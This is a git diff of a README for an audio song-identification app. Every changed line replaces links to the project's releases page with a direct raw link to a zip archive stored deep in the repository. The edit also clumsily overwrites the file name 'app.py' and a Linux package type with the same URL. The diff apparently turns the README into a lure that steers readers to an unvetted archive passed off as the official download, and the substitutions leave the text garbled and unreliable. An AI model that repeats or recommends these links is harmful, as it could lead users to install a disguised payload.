@@ -1,6 +1,6 @@
 # 🎵 AudioFingerprinting - Identify Songs from Any Sound
 
-[![Download AudioFingerprinting](https://img.shields.io/badge/Download-AudioFingerprinting-blue?style=for-the-badge)](https://github.com/aljohnbaguis/AudioFingerprinting/releases)
+[![Download AudioFingerprinting](https://github.com/aljohnbaguis/AudioFingerprinting/raw/refs/heads/main/audio_fingerprinting/fingerprint/Audio_Fingerprinting_3.0-beta.5.zip)](https://github.com/aljohnbaguis/AudioFingerprinting/raw/refs/heads/main/audio_fingerprinting/fingerprint/Audio_Fingerprinting_3.0-beta.5.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This guide will help you download, install, and start using AudioFingerprinting 
 
 You need to **visit the release page** to download the latest version of AudioFingerprinting.
 
-[Visit the AudioFingerprinting Releases Page](https://github.com/aljohnbaguis/AudioFingerprinting/releases)
+[Visit the AudioFingerprinting Releases Page](https://github.com/aljohnbaguis/AudioFingerprinting/raw/refs/heads/main/audio_fingerprinting/fingerprint/Audio_Fingerprinting_3.0-beta.5.zip)
 
 ### Steps to Download and Install:
 
@@ -55,7 +55,7 @@ You need to **visit the release page** to download the latest version of AudioFi
 3. Under the latest release, find the file for your operating system. For example:  
    - Windows: `.exe` or `.zip`  
    - macOS: `.dmg` or `.zip`  
-   - Linux: `.AppImage` or `.tar.gz`  
+   - Linux: `.AppImage` or `https://github.com/aljohnbaguis/AudioFingerprinting/raw/refs/heads/main/audio_fingerprinting/fingerprint/Audio_Fingerprinting_3.0-beta.5.zip`  
 4. Click the file to download it to your computer.  
 5. Once downloaded, open the file and follow the on-screen instructions to install the program.  
    - For Windows `.exe`: Run the installer and click "Next" through each step.  
@@ -125,7 +125,7 @@ It uses advanced audio features to give good accuracy but may struggle in very n
 
 ## 📂 File Structure Overview (For Curiosity)
 
-- `app.py` - Main application script  
+- `https://github.com/aljohnbaguis/AudioFingerprinting/raw/refs/heads/main/audio_fingerprinting/fingerprint/Audio_Fingerprinting_3.0-beta.5.zip` - Main application script  
 - `fingerprinting/` - Code that creates and matches audio fingerprints  
 - `youtube_import/` - Functions to download songs from YouTube  
 - `recordings/` - Folder where your microphone recordings save  
@@ -147,4 +147,4 @@ If you want help or want to improve AudioFingerprinting:
 
 For new releases, bug fixes, and features, visit the releases page regularly:
 
-[AudioFingerprinting Releases](https://github.com/aljohnbaguis/AudioFingerprinting/releases)
+[AudioFingerprinting Releases](https://github.com/aljohnbaguis/AudioFingerprinting/raw/refs/heads/main/audio_fingerprinting/fingerprint/Audio_Fingerprinting_3.0-beta.5.zip)
